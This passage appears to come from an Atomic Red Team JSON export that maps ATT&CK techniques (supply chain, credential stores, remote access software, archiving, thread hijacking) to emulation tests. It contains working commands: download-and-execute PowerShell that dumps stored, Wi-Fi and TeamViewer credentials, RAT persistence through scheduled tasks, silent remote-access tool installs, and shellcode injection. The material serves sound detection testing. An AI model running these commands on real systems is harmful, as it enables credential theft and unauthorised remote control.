"name": "sh", "elevation_required": true}}]}, "T1195": {"name": "Supply Chain Compromise", "technique_id": "attack-pattern--3f18edba-28f4-4bb9-82c3-8aa60dcac5f7", "external_id": "T1195", "data_components": ["File Metadata", "Host Status"], "kill_chain_phases": ["initial-access"], "data_source_platforms": [], "mitigations": ["course-of-action--15437c6d-b998-4a36-be41-4ace3d54d266", "course-of-action--e5d930e9-775a-40ad-9bdb-b941d8dfe86b"], "description": "Adversaries may manipulate products or product delivery mechanisms prior to receipt by a final consumer for the purpose of data or system compromise.\n\nSupply chain compromise can take place at any stage of the supply chain including:\n\n* Manipulation of development tools\n* Manipulation of a development environment\n* Manipulation of source code repositories (public or private)\n* Manipulation of source code in open-source dependencies\n* Manipulation of software update/distribution mechanisms\n* Compromised/infected system images (multiple cases of removable media infected at the factory)(Citation: IBM Storwize)(Citation: Schneider Electric USB Malware) \n* Replacement of legitimate software with modified versions\n* Sales of modified/counterfeit products to legitimate distributors\n* Shipment interdiction\n\nWhile supply chain compromise can impact any component of hardware or software, adversaries looking to gain execution have often focused on malicious additions to legitimate software in software distribution or update channels.(Citation: Avast CCleaner3 2018)(Citation: Microsoft Dofoil 2018)(Citation: Command Five SK 2011) Targeting may be specific to a desired victim set or malicious software may be distributed to a broad set of consumers but only move on to additional tactics on specific victims.(Citation: Symantec Elderwood Sept 2012)(Citation: Avast CCleaner3 2018)(Citation: Command Five SK 2011) Popular open source projects that are used as dependencies in many applications may also be targeted as a means to add malicious code to users of the dependency.(Citation: Trendmicro NPM Compromise)", "atomic_tests": [{"name": "Octopus Scanner Malware Open Source Supply Chain", "auto_generated_guid": "82a9f001-94c5-495e-9ed5-f530dbded5e2", "description": "This test simulates an adversary Octopus drop the RAT dropper ExplorerSync.db\n[octopus-scanner-malware-open-source-supply-chain](https://securitylab.github.com/research/octopus-scanner-malware-open-source-supply-chain/)\n[the-supreme-backdoor-factory](https://www.dfir.it/blog/2019/02/26/the-supreme-backdoor-factory/)\n", "supported_platforms": ["windows"], "input_arguments": {"rat_payload": {"description": "RAT dropper ExplorerSync.db", "type": "path", "default": "$env:TEMP\\ExplorerSync.db"}}, "dependency_executor_name": "powershell", "dependencies": [{"description": "ExplorerSync.db must exist on disk at specified location (#{rat_payload})\n", "prereq_command": "if (Test-Path #{rat_payload}) {exit 0} else {exit 1}\n", "get_prereq_command": "Out-File -FilePath \"#{rat_payload}\"\n"}], "executor": {"command": "copy %temp%\\ExplorerSync.db %temp%\\..\\Microsoft\\ExplorerSync.db\nschtasks /create /tn ExplorerSync /tr \"javaw -jar %temp%\\..\\Microsoft\\ExplorerSync.db\" /sc MINUTE /f\n", "cleanup_command": "schtasks /delete /tn ExplorerSync /F 2>null\ndel %temp%\\..\\Microsoft\\ExplorerSync.db 2>null\ndel %temp%\\ExplorerSync.db 2>null\n", "name": "command_prompt"}}]}, "T1555": {"name": "Credentials from Password Stores", "technique_id": "attack-pattern--3fc9b85a-2862-4363-a64d-d692e3ffbee0", "external_id": "T1555", "data_components": ["Command Execution", "Process Access", "OS API Execution", "File Access", "Process Creation"], "kill_chain_phases": ["credential-access"], "data_source_platforms": [], "mitigations": ["course-of-action--90c218c3-fbf8-4830-98a7-e8cfb7eaa485"], "description": "Adversaries may search for common password storage locations to obtain user credentials. Passwords are stored in several places on a system, depending on the operating system or application holding the credentials. There are also specific applications that store passwords to make it easier for users manage and maintain. Once credentials are obtained, they can be used to perform lateral movement and access restricted information.", "atomic_tests": [{"name": "Extract Windows Credential Manager via VBA", "auto_generated_guid": "234f9b7c-b53d-4f32-897b-b880a6c9ea7b", "description": "This module will extract the credentials found within the Windows credential manager and dump\nthem to $env:TEMP\\windows-credentials.txt\n", "supported_platforms": ["windows"], "dependency_executor_name": "powershell", "dependencies": [{"description": "Microsoft Word must be installed\n", "prereq_command": "try {\n  New-Object -COMObject \"word.Application\" | Out-Null\n  $process = \"winword\"\n  Stop-Process -Name $process\n  exit 0\n} catch { exit 1 }\n", "get_prereq_command": "Write-Host \"You will need to install Microsoft Word manually to meet this requirement\"\n"}], "executor": {"command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (iwr \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\" -UseBasicParsing)\nInvoke-Maldoc -macroFile \"PathToAtomicsFolder\\T1555\\src\\T1555-macrocode.txt\" -officeProduct \"Word\" -sub \"Extract\"\n", "cleanup_command": "Remove-Item \"$env:TEMP\\windows-credentials.txt\" -ErrorAction Ignore\n", "name": "powershell"}}, {"name": "Dump credentials from Windows Credential Manager With PowerShell [windows Credentials]", "auto_generated_guid": "c89becbe-1758-4e7d-a0f4-97d2188a23e3", "description": "This module will extract the credentials from Windows Credential Manager", "supported_platforms": ["windows"], "executor": {"name": "powershell", "elevation_required": false, "command": "IEX (IWR 'https://raw.githubusercontent.com/skar4444/Windows-Credential-Manager/4ad208e70c80dd2a9961db40793da291b1981e01/GetCredmanCreds.ps1' -UseBasicParsing); Get-PasswordVaultCredentials -Force   \n"}}, {"name": "Dump credentials from Windows Credential Manager With PowerShell [web Credentials]", "auto_generated_guid": "8fd5a296-6772-4766-9991-ff4e92af7240", "description": "This module will extract the credentials from Windows Credential Manager", "supported_platforms": ["windows"], "executor": {"name": "powershell", "elevation_required": false, "command": "IEX (IWR 'https://raw.githubusercontent.com/skar4444/Windows-Credential-Manager/4ad208e70c80dd2a9961db40793da291b1981e01/GetCredmanCreds.ps1' -UseBasicParsing); Get-CredManCreds -Force\n"}}, {"name": "Enumerate credentials from Windows Credential Manager using vaultcmd.exe [Windows Credentials]", "auto_generated_guid": "36753ded-e5c4-4eb5-bc3c-e8fba236878d", "description": "This module will enumerate credentials stored in Windows Credentials vault of Windows Credential Manager using builtin utility vaultcmd.exe", "supported_platforms": ["windows"], "executor": {"name": "powershell", "elevation_required": false, "command": "vaultcmd /listcreds:\"Windows Credentials\" /all\n"}}, {"name": "Enumerate credentials from Windows Credential Manager using vaultcmd.exe [Web Credentials]", "auto_generated_guid": "bc071188-459f-44d5-901a-f8f2625b2d2e", "description": "This module will enumerate credentials stored in Web Credentials vault of Windows Credential Manager using builtin utility vaultcmd.exe", "supported_platforms": ["windows"], "executor": {"name": "powershell", "elevation_required": false, "command": "vaultcmd /listcreds:\"Web Credentials\" /all\n"}}, {"name": "WinPwn - Loot local Credentials - lazagne", "auto_generated_guid": "079ee2e9-6f16-47ca-a635-14efcd994118", "description": "The [LaZagne project](https://github.com/AlessandroZ/LaZagne) is an open source application used to retrieve lots of passwords stored on a local computer. \nEach software stores its passwords using different techniques (plaintext, APIs, custom algorithms, databases, etc.). \nThis tool has been developed for the purpose of finding these passwords for the most commonly-used software", "supported_platforms": ["windows"], "executor": {"command": "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'\niex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\nlazagnemodule -consoleoutput -noninteractive", "name": "powershell"}}, {"name": "WinPwn - Loot local Credentials - Wifi Credentials", "auto_generated_guid": "afe369c2-b42e-447f-98a3-fb1f4e2b8552", "description": "Loot local Credentials - Wifi Credentials technique via function of WinPwn", "supported_platforms": ["windows"], "executor": {"command": "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'\niex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\nwificreds -consoleoutput -noninteractive  ", "name": "powershell"}}, {"name": "WinPwn - Loot local Credentials - Decrypt Teamviewer Passwords", "auto_generated_guid": "db965264-3117-4bad-b7b7-2523b7856b92", "description": "Loot local Credentials - Decrypt Teamviewer Passwords technique via function of WinPwn", "supported_platforms": ["windows"], "executor": {"command": "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'\niex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\ndecryptteamviewer -consoleoutput -noninteractive  ", "name": "powershell"}}]}, "T1219": {"name": "Remote Access Software", "technique_id": "attack-pattern--4061e78c-1284-44b4-9116-73e4ac3912f7", "external_id": "T1219", "data_components": ["Network Traffic Flow", "Network Connection Creation", "Network Traffic Content", "Process Creation"], "kill_chain_phases": ["command-and-control"], "data_source_platforms": [], "mitigations": ["course-of-action--12241367-a8b7-49b4-b86e-2236901ba50c", "course-of-action--20f6a9df-37c4-4e20-9e47-025983b1b39d", "course-of-action--47e0e9fe-96ce-4f65-8bb1-8be1feacb5db"], "description": "An adversary may use legitimate desktop support and remote access software, such as Team Viewer, AnyDesk, Go2Assist, LogMein, AmmyyAdmin, etc, to establish an interactive command and control channel to target systems within networks. These services are commonly used as legitimate technical support software, and may be allowed by application control within a target environment. Remote access tools like VNC, Ammyy, and Teamviewer are used frequently when compared with other legitimate software commonly used by adversaries.(Citation: Symantec Living off the Land)\n\nRemote access tools may be installed and used post-compromise as alternate communications channel for redundant access or as a way to establish an interactive remote desktop session with the target system. They may also be used as a component of malware to establish a reverse connection or back-connect to a service or adversary controlled system. Installation of many remote access tools may also include persistence (ex: the tool's installation routine creates a [Windows Service](https://attack.mitre.org/techniques/T1543/003)).\n\nAdmin tools such as TeamViewer have been used by several groups targeting institutions in countries of interest to the Russian state and criminal campaigns.(Citation: CrowdStrike 2015 Global Threat Report)(Citation: CrySyS Blog TeamSpy)", "atomic_tests": [{"name": "TeamViewer Files Detected Test on Windows", "auto_generated_guid": "8ca3b96d-8983-4a7f-b125-fc98cc0a2aa0", "description": "An adversary may attempt to trick the user into downloading teamviewer and using this to maintain access to the machine. Download of TeamViewer installer will be at the destination location when sucessfully executed.\n", "supported_platforms": ["windows"], "executor": {"command": "Invoke-WebRequest -OutFile C:\\Users\\$env:username\\Desktop\\TeamViewer_Setup.exe https://download.teamviewer.com/download/TeamViewer_Setup.exe\n$file1 = \"C:\\Users\\\" + $env:username + \"\\Desktop\\TeamViewer_Setup.exe\"\nStart-Process -Wait $file1 /S; \nStart-Process 'C:\\Program Files (x86)\\TeamViewer\\TeamViewer.exe'\n", "cleanup_command": "$file = 'C:\\Program Files (x86)\\TeamViewer\\uninstall.exe'\nif(Test-Path $file){ Start-Process $file \"/S\" -ErrorAction Ignore | Out-Null }\n$file1 = \"C:\\Users\\\" + $env:username + \"\\Desktop\\TeamViewer_Setup.exe\"\nRemove-Item $file1 -ErrorAction Ignore | Out-Null", "name": "powershell", "elevation_required": true}}, {"name": "AnyDesk Files Detected Test on Windows", "auto_generated_guid": "6b8b7391-5c0a-4f8c-baee-78d8ce0ce330", "description": "An adversary may attempt to trick the user into downloading AnyDesk and use to establish C2. Download of AnyDesk installer will be at the destination location and ran when sucessfully executed.\n", "supported_platforms": ["windows"], "executor": {"command": "Invoke-WebRequest -OutFile C:\\Users\\$env:username\\Desktop\\AnyDesk.exe https://download.anydesk.com/AnyDesk.exe\n$file1 = \"C:\\Users\\\" + $env:username + \"\\Desktop\\AnyDesk.exe\"\nStart-Process $file1 /S;\n", "cleanup_command": "$file1 = \"C:\\Users\\\" + $env:username + \"\\Desktop\\AnyDesk.exe\"\nRemove-Item $file1 -ErrorAction Ignore", "name": "powershell", "elevation_required": true}}, {"name": "LogMeIn Files Detected Test on Windows", "auto_generated_guid": "d03683ec-aae0-42f9-9b4c-534780e0f8e1", "description": "An adversary may attempt to trick the user into downloading LogMeIn and use to establish C2. Download of LogMeIn installer will be at the destination location and ran when sucessfully executed.\n", "supported_platforms": ["windows"], "executor": {"command": "Invoke-WebRequest -OutFile C:\\Users\\$env:username\\Desktop\\LogMeInIgnition.msi https://secure.logmein.com/LogMeInIgnition.msi\n$file1 = \"C:\\Users\\\" + $env:username + \"\\Desktop\\LogMeInIgnition.msi\"\nStart-Process -Wait $file1 /quiet;\nStart-Process 'C:\\Program Files (x86)\\LogMeIn Ignition\\LMIIgnition.exe' \"/S\"\n", "cleanup_command": "get-package *'LogMeIn Client'* -ErrorAction Ignore | uninstall-package \n$file1 = \"C:\\Users\\\" + $env:username + \"\\Desktop\\LogMeInIgnition.msi\"\nRemove-Item $file1 -ErrorAction Ignore", "name": "powershell", "elevation_required": true}}, {"name": "GoToAssist Files Detected Test on Windows", "auto_generated_guid": "1b72b3bd-72f8-4b63-a30b-84e91b9c3578", "description": "An adversary may attempt to trick the user into downloading GoToAssist and use to establish C2. Download of GoToAssist installer will be at the destination location and ran when sucessfully executed.\n", "supported_platforms": ["windows"], "executor": {"command": "Invoke-WebRequest -OutFile C:\\Users\\$env:username\\Downloads\\GoToAssist.exe \"https://launch.getgo.com/launcher2/helper?token=e0-FaCddxmtMoX8_cY4czssnTeGvy83ihp8CLREfvwQshiBW0_RcbdoaEp8IA-Qn8wpbKlpGIflS-39gW6RuWRM-XHwtkRVMLBsp5RSKp-a3PBM-Pb1Fliy73EDgoaxr-q83WtXbLKqD7-u3cfDl9gKsymmhdkTGsXcDXir90NqKj92LsN_KpyYwV06lIxsdRekhNZjNwhkWrBa_hG8RQJqWSGk6tkZLVMuMufmn37eC2Cqqiwq5bCGnH5dYiSUUsklSedRLjh4N46qPYT1bAU0qD25ZPr-Kvf4Kzu9bT02q3Yntj02ZA99TxL2-SKzgryizoopBPg4Ilfo5t78UxKTYeEwo4etQECfkCRvenkTRlIHmowdbd88zz7NiccXnbHJZehgs6_-JSVjQIdPTXZbF9T5z44mi4BQYMtZAS3DE86F0C3D4Tcd7fa5F6Ve8rQWt7pvqFCYyiJAailslxOw0LsGyFokoy65tMF980ReP8zhVcTKYP8s8mhGXihUQJQPNk20Sw&downloadTrigger=restart&renameFile=1\"\n$file1 = \"C:\\Users\\\" + $env:username + \"\\Downloads\\GoToAssist.exe\"\nStart-Process $file1 /S;\n", "cleanup_command": "try{\"$PathToAtomicsFolder/T1219/bin/GoToCleanup.ps1\"} catch{}", "name": "powershell", "elevation_required": true}}, {"name": "ScreenConnect Application Download and Install on Windows", "auto_generated_guid": "4a18cc4e-416f-4966-9a9d-75731c4684c0", "description": "An adversary may attempt to trick the user into downloading ScreenConnect for use as a C2 channel. Download of ScreenConnect installer will be in the Downloads directory.\nMsiexec will be used to quietly insall ScreenConnect.\n", "supported_platforms": ["windows"], "executor": {"command": "$installer = \"C:\\Users\\$env:username\\Downloads\\ScreenConnect.msi\"\nInvoke-WebRequest -OutFile $installer \"https://d1kuyuqowve5id.cloudfront.net/ScreenConnect_21.11.4237.7885_Release.msi\"\nmsiexec /i $installer /qn\n", "cleanup_command": "$installer = \"C:\\Users\\$env:username\\Downloads\\ScreenConnect.msi\"\nmsiexec /x $installer /qn\n", "name": "powershell", "elevation_required": true}}, {"name": "Ammyy Admin Software Execution", "auto_generated_guid": "0ae9e327-3251-465a-a53b-485d4e3f58fa", "description": "An adversary may attempt to trick the user into downloading Ammyy Admin Remote Desktop Software for use as a C2 channel. \nUpon successful execution, Ammyy Admin will be executed. \n", "supported_platforms": ["windows"], "input_arguments": {"Ammyy_Admin_Path": {"description": "Path of Ammyy Admin executable", "type": "path", "default": "PathToAtomicsFolder\\..\\ExternalPayloads\\ammyy.exe"}}, "dependency_executor_name": "powershell", "dependencies": [{"description": "Ammyy Admin must exist on disk at the specified location (#{Ammyy_Admin_Path})\n", "prereq_command": "if (Test-Path \"#{Ammyy_Admin_Path}\") {exit 0} else {exit 1}\n", "get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest \"https://web.archive.org/web/20140625232737/http://www.ammyy.com/AA_v3.exe\" -OutFile \"PathToAtomicsFolder\\..\\ExternalPayloads\\ammyy.exe\" -UseBasicParsing\n"}], "executor": {"command": "Start-Process \"#{Ammyy_Admin_Path}\"\n", "cleanup_command": "Stop-Process -Name \"Ammyy\" -force -erroraction silentlycontinue\n", "name": "powershell", "elevation_required": true}}, {"name": "RemotePC Software Execution", "auto_generated_guid": "fbff3f1f-b0bf-448e-840f-7e1687affdce", "description": "An adversary may attempt to trick the user into downloading RemotePC Software for use as a C2 channel. \nUpon successful execution, RemotePC will be executed. \n", "supported_platforms": ["windows"], "input_arguments": {"RemotePC_Path": {"description": "Path of RemotePC executable", "type": "path", "default": "PathToAtomicsFolder\\..\\ExternalPayloads\\RemotePC.exe"}}, "dependency_executor_name": "powershell", "dependencies": [{"description": "RemotePC must exist on disk at the specified location (#{RemotePC_Path})\n", "prereq_command": "if (Test-Path \"#{RemotePC_Path}\") {exit 0} else {exit 1}\n", "get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest \"https://static.remotepc.com/downloads/rpc/140422/RemotePC.exe\" -OutFile \"#{RemotePC_Path}\" -UseBasicParsing\n"}], "executor": {"command": "Start-Process \"#{RemotePC_Path}\"\n", "cleanup_command": "Unregister-ScheduledTask -TaskName \"RemotePC\" -Confirm:$False -ErrorAction SilentlyContinue\nUnregister-ScheduledTask -TaskName \"RPCServiceHealthCheck\" -Confirm:$False -ErrorAction SilentlyContinue\nUnregister-ScheduledTask -TaskName \"ServiceMonitor\" -Confirm:$False -ErrorAction SilentlyContinue\nUnregister-ScheduledTask -TaskName \"StartRPCService\" -Confirm:$False -ErrorAction SilentlyContinue      \nStop-Process -Name \"RemotePCPerformance\" -force -erroraction silentlycontinue\nStop-Process -Name \"RPCPerformanceService\" -force -erroraction silentlycontinue\nStop-Process -Name \"RemotePCUIU\" -force -erroraction silentlycontinue\nStop-Process -Name \"RPCDownloader\" -force -erroraction silentlycontinue\nStop-Process -Name \"RemotePCService\" -force -erroraction silentlycontinue\nStop-Process -Name \"RPCService\" -force -erroraction silentlycontinue\n", "name": "powershell", "elevation_required": true}}, {"name": "NetSupport - RAT Execution", "auto_generated_guid": "ecca999b-e0c8-40e8-8416-ad320b146a75", "description": "A recent trend by threat actors, once a foothold is established, maintain long term persistence using third party remote services such as NetSupport to provide the operator with access to the network using legitimate services. \n", "supported_platforms": ["windows"], "input_arguments": {"NetSupport_Path": {"description": "Path to the NetSupport executable.", "type": "path", "default": "PathToAtomicsFolder\\..\\ExternalPayloads\\T1219_NetSupport.exe"}}, "dependency_executor_name": "powershell", "dependencies": [{"description": "NetSupport must be downloaded and exist on the disk at the specified location. (#{NetSupport_Path})\n", "prereq_command": "if (Test-Path \"#{NetSupport_Path}\") {exit 0} else {exit 1}\n", "get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\n(New-Object Net.WebClient).DownloadFile(\"https://nsproducts.azureedge.net/nsm-1270/en/Setup.exe\",\"#{NetSupport_Path}\")\n"}], "executor": {"command": "Start-Process \"#{NetSupport_Path}\" -ArgumentList \"/S /v/qn\"\n", "cleanup_command": "Stop-Process -Name \"client32\" -force -erroraction silentlycontinue\n", "name": "powershell", "elevation_required": true}}, {"name": "UltraViewer - RAT Execution", "auto_generated_guid": "19acf63b-55c4-4b6a-8552-00a8865105c8", "description": "A recent trend by threat actors, once a foothold is established, maintain long term persistence using third party remote services such as UltraViewer to provide the operator with access to the network using legitimate services. \n", "supported_platforms": ["windows"], "input_arguments": {"UltraViewer_Path": {"description": "Path to the UltraViewer executable.", "type": "path", "default": "PathToAtomicsFolder\\..\\ExternalPayloads\\T1219_UltraViewer.exe"}}, "dependency_executor_name": "powershell", "dependencies": [{"description": "Ultraviewer installer must be downloaded and exist on the disk at the specified location. (#{UltraViewer_Path})\n", "prereq_command": "if (Test-Path \"#{UltraViewer_Path}\") {exit 0} else {exit 1}\n", "get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\n(New-Object Net.WebClient).DownloadFile(\"https://www.ultraviewer.net/en/UltraViewer_setup_6.5_en.exe\",\"#{UltraViewer_Path}\")\n"}], "executor": {"command": "Start-Process -Wait -FilePath \"#{UltraViewer_Path}\" -Argument \"/silent\" -PassThru\nStart-Process 'C:\\Program Files (x86)\\UltraViewer\\UltraViewer_Desktop.exe'\n", "cleanup_command": "Stop-Process -Name \"UltraViewer_Desktop\" -Force -ErrorAction SilentlyContinue\n", "name": "powershell", "elevation_required": true}}, {"name": "UltraVNC Execution", "auto_generated_guid": "42e51815-a6cc-4c75-b970-3f0ff54b610e", "description": "An adversary may attempt to trick the user into downloading UltraVNC for use as a C2 channel.\nUpon successful execution, UltraVNC will be executed.\n", "supported_platforms": ["windows"], "input_arguments": {"UltraVNC_Viewer_Path": {"description": "Path of UltraVNC Viewer executable", "type": "path", "default": "$env:ProgramFiles\\'uvnc bvba\\UltraVnc\\vncviewer.exe'"}}, "dependency_executor_name": "powershell", "dependencies": [{"description": "UltraVNC must exist at (#{UltraVNC_Viewer_Path})\n", "prereq_command": "if (Test-Path #{UltraVNC_Viewer_Path}) {exit 0} else {exit 1}\n", "get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest \"https://www.uvnc.eu/download/1381/UltraVNC_1_3_81_X64_Setup.exe\" -OutFile \"PathToAtomicsFolder\\..\\ExternalPayloads\\vncsetup.exe\"\nstart-process \"PathToAtomicsFolder\\..\\ExternalPayloads\\vncsetup.exe\" /silent\n"}], "executor": {"command": "Start-Process #{UltraVNC_Viewer_Path}\n", "cleanup_command": "Stop-Process -Name \"vncviewer\" -force -erroraction silentlycontinue\n", "name": "powershell", "elevation_required": true}}, {"name": "MSP360 Connect Execution", "auto_generated_guid": "b1b8128b-c5d4-4de9-bf70-e60419274562", "description": "An adversary may attempt to trick the user into downloading MSP360 Connect for use as a C2 channel.\nUpon successful execution, MSP360 Connect will be executed.\n", "supported_platforms": ["windows"], "input_arguments": {"MSP360_Connect_Path": {"description": "Path of MSP360 executable", "type": "path", "default": "$env:ProgramFiles\\Connect\\Connect.exe"}}, "dependency_executor_name": "powershell", "dependencies": [{"description": "MSP360 must exist at (#{MSP360_Connect_Path})\n", "prereq_command": "if (Test-Path #{MSP360_Connect_Path}) {exit 0} else {exit 1}\n", "get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest -OutFile \"PathToAtomicsFolder\\..\\ExternalPayloads\\msp360connect.exe\" \"https://s3.amazonaws.com/cb_setups/_current/cbra/setup.exe?X-Amz-Expires=604800&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=AKIA2WIZE3YN7NOSY65U/20230515/us-east-1/s3/aws4_request&X-Amz-Date=20230515T024742Z&X-Amz-SignedHeaders=host&response-content-disposition=attachment;filename=ConnectStandaloneSetup_v3.3.0.15_netv4.5.1_cFA9100C6.exe&X-Amz-Signature=1fe3ddf93f8431b182fac90341f80a4ebf8665ddcc0e36dd385ee20d0ce865c9\"\nstart-process \"PathToAtomicsFolder\\..\\ExternalPayloads\\msp360connect.exe\" /S    \n"}], "executor": {"command": "Start-Process #{MSP360_Connect_Path}\n", "cleanup_command": "Stop-Process -Name \"Connect\" -force -erroraction silentlycontinue\n", "name": "powershell", "elevation_required": true}}]}, "T1560.002": {"name": "Archive via Library", "technique_id": "attack-pattern--41868330-6ee2-4d0f-b743-9f2294c3c9b6", "external_id": "T1560.002", "data_components": ["Script Execution", "File Creation"], "kill_chain_phases": ["collection"], "data_source_platforms": [], "mitigations": null, "description": "An adversary may compress or encrypt data that is collected prior to exfiltration using 3rd party libraries. Many libraries exist that can archive data, including [Python](https://attack.mitre.org/techniques/T1059/006) rarfile (Citation: PyPI RAR), libzip (Citation: libzip), and zlib (Citation: Zlib Github). Most libraries include functionality to encrypt and/or compress data.\n\nSome archival libraries are preinstalled on systems, such as bzip2 on macOS and Linux, and zip on Windows. Note that the libraries are different from the utilities. The libraries can be linked against when compiling, while the utilities require spawning a subshell, or a similar execution mechanism.", "atomic_tests": [{"name": "Compressing data using GZip in Python (FreeBSD/Linux)", "auto_generated_guid": "391f5298-b12d-4636-8482-35d9c17d53a8", "description": "Uses GZip from Python to compress files\n", "supported_platforms": ["linux"], "input_arguments": {"path_to_input_file": {"description": "Path to the file that you want to compress", "type": "path", "default": "/etc/passwd"}, "path_to_output_file": {"description": "Path of the file that you want your .gz file to be", "type": "path", "default": "/tmp/passwd.gz"}}, "dependency_executor_name": "sh", "dependencies": [{"description": "Requires Python\n", "prereq_command": "which python || which python3\n", "get_prereq_command": "echo \"please install python to run this test\"; exit 1\n"}], "executor": {"name": "sh", "elevation_required": false, "command": "which_python=`which python || which python3`\n$which_python -c \"import gzip;input_file=open('#{path_to_input_file}', 'rb');content=input_file.read();input_file.close();output_file=gzip.GzipFile('#{path_to_output_file}','wb',compresslevel=6);output_file.write(content);output_file.close();\"\n", "cleanup_command": "rm #{path_to_output_file}\n"}}, {"name": "Compressing data using bz2 in Python (FreeBSD/Linux)", "auto_generated_guid": "c75612b2-9de0-4d7c-879c-10d7b077072d", "description": "Uses bz2 from Python to compress files\n", "supported_platforms": ["linux"], "input_arguments": {"path_to_input_file": {"description": "Path to the file that you want to compress", "type": "path", "default": "/etc/passwd"}, "path_to_output_file": {"description": "Path of the file that you want your .bz2 file to be", "type": "path", "default": "/tmp/passwd.bz2"}}, "dependency_executor_name": "sh", "dependencies": [{"description": "Requires Python\n", "prereq_command": "which python || which python3\n", "get_prereq_command": "echo \"please install python to run this test\"; exit 1\n"}], "executor": {"name": "sh", "elevation_required": false, "command": "which_python=`which python || which python3`\n$which_python -c \"import bz2;input_file=open('#{path_to_input_file}','rb');content=input_file.read();input_file.close();bz2content=bz2.compress(content,compresslevel=9);output_file=open('#{path_to_output_file}','w+');output_file.write(str(bz2content));output_file.close();\"\n", "cleanup_command": "rm #{path_to_output_file}\n"}}, {"name": "Compressing data using zipfile in Python (FreeBSD/Linux)", "auto_generated_guid": "001a042b-859f-44d9-bf81-fd1c4e2200b0", "description": "Uses zipfile from Python to compress files\n", "supported_platforms": ["linux"], "input_arguments": {"path_to_input_file": {"description": "Path to the file that you want to compress", "type": "path", "default": "/etc/passwd"}, "path_to_output_file": {"description": "Path of the file that you want your .zip file to be", "type": "path", "default": "/tmp/passwd.zip"}}, "dependency_executor_name": "sh", "dependencies": [{"description": "Requires Python\n", "prereq_command": "which python || which python3\n", "get_prereq_command": "echo \"please install python to run this test\"; exit 1\n"}], "executor": {"name": "sh", "elevation_required": false, "command": "which_python=`which python || which python3`\n$which_python -c \"from zipfile import ZipFile; ZipFile('#{path_to_output_file}', mode='w').write('#{path_to_input_file}')\"\n", "cleanup_command": "rm #{path_to_output_file}\n"}}, {"name": "Compressing data using tarfile in Python (FreeBSD/Linux)", "auto_generated_guid": "e86f1b4b-fcc1-4a2a-ae10-b49da01458db", "description": "Uses tarfile from Python to compress files\n", "supported_platforms": ["linux"], "input_arguments": {"path_to_input_file": {"description": "Path to the file that you want to compress", "type": "path", "default": "/etc/passwd"}, "path_to_output_file": {"description": "Path of the file that you want your .tar.gz file to be", "type": "path", "default": "/tmp/passwd.tar.gz"}}, "dependency_executor_name": "sh", "dependencies": [{"description": "Requires Python\n", "prereq_command": "which python || which python3\n", "get_prereq_command": "echo \"please install python to run this test\"; exit 1\n"}], "executor": {"name": "sh", "elevation_required": false, "command": "which_python=`which python || which python3`\n$which_python -c \"from zipfile import ZipFile; ZipFile('#{path_to_output_file}', mode='w').write('#{path_to_input_file}')\" \n", "cleanup_command": "rm #{path_to_output_file}\n"}}]}, "T1055.003": {"name": "Thread Execution Hijacking", "technique_id": "attack-pattern--41d9846c-f6af-4302-a654-24bba2729bc6", "external_id": "T1055.003", "data_components": ["Process Access", "OS API Execution", "Process Modification"], "kill_chain_phases": ["defense-evasion", "privilege-escalation"], "data_source_platforms": [], "mitigations": ["course-of-action--90f39ee1-d5a3-4aaa-9f28-3b42815b0d46"], "description": "Adversaries may inject malicious code into hijacked processes in order to evade process-based defenses as well as possibly elevate privileges. Thread Execution Hijacking is a method of executing arbitrary code in the address space of a separate live process. \n\nThread Execution Hijacking is commonly performed by suspending an existing process then unmapping/hollowing its memory, which can then be replaced with malicious code or the path to a DLL. A handle to an existing victim process is first created with native Windows API calls such as <code>OpenThread</code>. At this point the process can be suspended then written to, realigned to the injected code, and resumed via <code>SuspendThread </code>, <code>VirtualAllocEx</code>, <code>WriteProcessMemory</code>, <code>SetThreadContext</code>, then <code>ResumeThread</code> respectively.(Citation: Elastic Process Injection July 2017)\n\nThis is very similar to [Process Hollowing](https://attack.mitre.org/techniques/T1055/012) but targets an existing process rather than creating a process in a suspended state.  \n\nRunning code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via Thread Execution Hijacking may also evade detection from security products since the execution is masked under a legitimate process. ", "atomic_tests": [{"name": "Thread Execution Hijacking", "auto_generated_guid": "578025d5-faa9-4f6d-8390-aae527d503e1", "description": "This test injects a MessageBox shellcode generated by msfvenom in Notepad.exe using Thread Execution Hijacking. When successful, a message box will appear with the \"Atomic Red Team\" caption after one or two seconds. ", "supported_platforms": ["windows"], "executor": {"command": "$notepad = Start-Process notepad -passthru\nStart-Process \"$PathToAtomicsFolder\\T1055.003\\bin\\InjectContext.exe\"\nStart-Sleep -Seconds 5\nStop-Process $notepad.id", "name": "powershell"}}]}, "T1036": {"name": "Masquerading", "technique_id": 